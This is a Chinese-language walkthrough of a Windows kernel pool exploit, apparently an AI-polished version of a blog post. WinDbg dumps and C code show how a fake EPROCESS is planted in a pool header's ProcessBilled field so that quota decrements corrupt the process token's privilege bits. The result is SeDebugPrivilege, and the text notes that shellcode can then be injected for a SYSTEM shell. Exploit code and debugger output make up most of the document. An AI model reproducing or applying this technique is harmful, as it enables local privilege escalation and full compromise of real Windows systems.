### 优化后的文本

#### 1. 检查TOKEN结构
```plaintext
0: kd> dt nt!_TOKEN ffffb800`08ddb060
       +0x000 TokenSource      : _TOKEN_SOURCE
       +0x010 TokenId          : _LUID
       +0x018 AuthenticationId : _LUID
       +0x020 ParentTokenId    : _LUID
       +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
       +0x030 TokenLock        : 0xffffe102`fe18dc90 _ERESOURCE
       +0x038 ModifiedId       : _LUID
       +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
       +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
       +0x078 SessionId        : 1
```

#### 2. 查看SEP_TOKEN_PRIVILEGES
```plaintext
0: kd> dx -id 0,0,ffffe102fa07b300 -r1 (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0))
(*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0)) [Type: _SEP_TOKEN_PRIVILEGES]
    [+0x000] Present          : 0x602880000 [Type: unsigned __int64] // 默认值为0x602880000
    [+0x008] Enabled          : 0x800000 [Type: unsigned __int64] // 默认值为0x800000
    [+0x010] EnabledByDefault : 0x40800000 [Type: unsigned __int64]
```

#### 3. 使用!TOKEN命令查看特权
```plaintext
0: kd> !TOKEN ffffb800`08ddb060
_TOKEN 0xffffb80008ddb060
    19 0x000000013 SeShutdownPrivilege               Attributes - 
    23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default // 默认只有SeChangeNotifyPrivilege权限
    25 0x000000019 SeUndockPrivilege                 Attributes - 
    33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - 
    34 0x000000022 SeTimeZonePrivilege               Attributes - 
```

#### 4. 构造FAKE_EPROCESS所需的值
此时，我们已经获取了构造FAKE_EPROCESS所需的所有值。

##### 函数 `setup_fake_eprocess`
```c
void setup_fake_eprocess(xploit_t *xploit) {
    char fake_eprocess_attribute_buf[0x1000] = {0};
    char fake_eprocess_buf[0x10000] = {0};
    strcpy(fake_eprocess_attribute_buf, DUMB_ATTRIBUTE_NAME2);
    initFakeEprocess(fake_eprocess_buf, (PVOID)(xploit->self_token + 0x48)); // 填入 self_token + 0x48
    memcpy(fake_eprocess_attribute_buf + DUMB_ATTRIBUTE_NAME2_LEN, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
    initFakeEprocess(fake_eprocess_buf, (PVOID)(xploit->self_token + 0x41)); // self_token + 0x41
    memcpy(fake_eprocess_attribute_buf + DUMB_ATTRIBUTE_NAME2_LEN + FAKE_EPROCESS_SIZE, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
    xploit->alloc_fake_eprocess(xploit, fake_eprocess_attribute_buf);
    printf("[+] fake_eprocess is : 0x%llx\n", xploit->fake_eprocess);
}
```

##### 自定义宏和变量
```c
#define DUMB_ATTRIBUTE_NAME2 "DUMB2"  
#define DUMB_ATTRIBUTE_NAME2_LEN sizeof(DUMB_ATTRIBUTE_NAME2)
```

##### 获取特定偏移处的值
```plaintext
0: kd> ? ffffb800`08ddb060 + 0x41
Evaluate expression: -79164688453471 = ffffb800`08ddb0a1
0: kd> dq ffffb800`08ddb0a1 L1
ffffb800`08ddb0a1  00000000`06028800 // Privileges.Present

0: kd> ? ffffb800`08ddb060 + 0x48
Evaluate expression: -79164688453464 = ffffb800`08ddb0a8
0: kd> dq ffffb800`08ddb0a8 L1
ffffb800`08ddb0a8  00000000`00800000 // Privileges.Enabled
```

#### 5. 将Fake_EPROCESS填充到POOL_HEADER的ProcessBilled字段
```c
xploit.setup_final_write(&xploit, final_write_buf); // 设置Pipe_Attribute属性中特定偏移处的值
free_pipes(xploit.respray);
xploit.respray = NULL;
free_pipes(xploit.rewrite); // 释放漏洞块
xploit.rewrite = NULL;
xploit.final_write = prepare_pipes(SPRAY_SIZE * 10, xploit.targeted_vuln_size + POOL_HEADER_SIZE, final_write_buf, xploit.spray_type);
if (!spray_pipes(xploit.final_write)) { // 重新占用漏洞块，并修复Pipe_Attribute为原始值，设置ProcessBilled指针
    goto leave_wait;
}
```

##### 填充完Fake_EPROCESS后，幽灵块的Pipe_Attribute如下
```plaintext
0: kd> dq ffffb80008cfb3e0
ffffb800`08cfb3e0  7441704e`03190000 ffffffff`ffffffff
ffffb800`08cfb3f0  ffffb800`09126710 ffffb800`09126710
ffffb800`08cfb400  ffffb800`08cfb418 00000000`00000156
ffffb800`08cfb410  ffffb800`08cfb41a 46464646`4646005a
ffffb800`08cfb420  41424344`08210000 d60eba94`936c5d5f
ffffb800`08cfb430  ffffb800`0885a190 ffffb800`0885a190 // list_nest 已经还原
ffffb800`08cfb440  00000000`0040e85a 46464646`46464646
ffffb800`08cfb450  46464646`46464646 46464646`46464646

0: kd> dt nt!_POOL_HEADER ffffb800`08cfb420
   +0x000 PreviousSize     : 0y00000000 (0)
   +0x000 PoolIndex        : 0y00000000 (0)
   +0x002 BlockSize        : 0y00100001 (0x21)
   +0x002 PoolType         : 0y00001000 (0x8)
   +0x000 Ulong1           : 0x8210000
   +0x004 PoolTag          : 0x41424344
   +0x008 ProcessBilled    : 0xd60eba94`936c5d5f _EPROCESS // 经过异或的FAKE_EPROCESS
   +0x008 AllocatorBackTraceIndex : 0x5d5f
   +0x00a PoolTagHash      : 0x936c
```

#### 6. 第一次释放幽灵块
当释放幽灵块时，FAKE_EPROCESS相关的Quota counter将会被递减，也就是会对Privileges.Enabled进行递减。
```c
xploit.free_ghost_chunk(&xploit); // 第一次释放幽灵块
xploit.alloc_ghost_chunk(&xploit, attribute); // 再次占用幽灵块
free_pipes(xploit.final_write);
xploit.final_write = NULL;
spray_pipes(xploit.final_write2); // 再次占用漏洞块，然后将新的幽灵块的ProcessBilled继续填充为FAKE_EPROCESS
```

##### 第一次释放幽灵块后的状态
```plaintext
0: kd> dq ffffb80008cfb3e0
ffffb800`08cfb3e0  7441704e`03190000 ffffffff`ffffffff
ffffb800`08cfb3f0  ffffb800`0956c870 ffffb800`0956c870
ffffb800`08cfb400  ffffb800`08cfb418 00000000`00000156
ffffb800`08cfb410  ffffb800`08cfb41a 46464646`4646005a
ffffb800`08cfb420  41424344`08e40000 d60eba94`936c581f
ffffb800`08cfb430  ffffb800`0885a190 ffffb800`0885a190
ffffb800`08cfb440  00000000`0040e85a 46464646`46464646
ffffb800`08cfb450  46464646`46464646 46464646`46464646

0: kd> dx -id 0,0,ffffe102fa07b300 -r1 (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0))
(*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0)) [Type: _SEP_TOKEN_PRIVILEGES]
    [+0x000] Present          : 0x602880000 [Type: unsigned __int64]
    [+0x008] Enabled          : 0x7ffdf0 [Type: unsigned __int64] // 可以看到，Privileges.Enabled的值已经改变
    [+0x010] EnabledByDefault : 0x40800000 [Type: unsigned __int64]

0: kd> dt nt!_POOL_HEADER ffffb800`08cfb420
   +0x000 PreviousSize     : 0y00000000 (0)
   +0x000 PoolIndex        : 0y00000000 (0)
   +0x002 BlockSize        : 0y11100100 (0xe4)
   +0x002 PoolType         : 0y00001000 (0x8)
   +0x000 Ulong1           : 0x8e40000
   +0x004 PoolTag          : 0x41424344
   +0x008 ProcessBilled    : 0xd60eba94`936c581f _EPROCESS // 第二次准备递减的异或后的FAKE_EPROCESS
   +0x008 AllocatorBackTraceIndex : 0x581f
   +0x00a PoolTagHash      : 0x936c
```

#### 7. 第二次释放幽灵块
```c
xploit.free_ghost_chunk(&xploit); // 第二次释放幽灵块
```

##### 第二次释放幽灵块后的状态
```plaintext
0: kd> dx -id 0,0,ffffe102fa07b300 -r1 (*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0))
(*((ntkrnlmp!_SEP_TOKEN_PRIVILEGES *)0xffffb80008ddb0a0)) [Type: _SEP_TOKEN_PRIVILEGES]
    [+0x000] Present          : 0x60279c000 [Type: unsigned __int64]
    [+0x008] Enabled          : 0x7ffdf0 [Type: unsigned __int64]
    [+0x010] EnabledByDefault : 0x40800000 [Type: unsigned __int64]
```

#### 8. 注入shellcode
到此为止，我们已经成功获取到了SeDebugPrivilege权限。
```plaintext
0: kd> dt _token ffff8b81`b54f8830
    .................................
    14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled 
    15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled 
    16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled 
    19 0x000000013 SeShutdownPrivilege               Attributes - Enabled 
    20 0x000000014 SeDebugPrivilege                  Attributes - Enabled 
    21 0x000000015 SeAuditPrivilege                  Attributes - Enabled 
    22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - Enabled 
    25 0x000000019 SeUndockPrivilege                 Attributes - 
    33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - 
    34 0x000000022 SeTimeZonePrivilege               Attributes - 
    ..................................

此时我们可以打开任意SYSTEM权限进程，并注入shellcode实现弹出一个SYSTEM权限的shell。
```

希望这些修改使文档更加清晰、连贯和专业。如果有任何进一步的需求，请告知。